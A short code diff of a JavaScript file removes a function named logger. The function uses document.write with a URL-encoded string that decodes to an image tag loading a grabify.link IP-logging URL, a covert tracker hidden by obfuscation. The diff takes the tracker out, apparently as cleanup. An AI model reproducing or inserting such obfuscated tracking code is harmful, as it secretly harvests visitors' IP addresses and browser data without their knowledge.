@@ -29,7 +29,3 @@ function sendMessage() {
 
     request.send(JSON.stringify(params));
   }
-
-  function logger() {
-    document.write(unescape('%20%20%20%20%20%20%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%67%72%61%62%69%66%79%2E%6C%69%6E%6B%2F%4A%34%48%54%43%4B%22%3E%0A'))
-  }
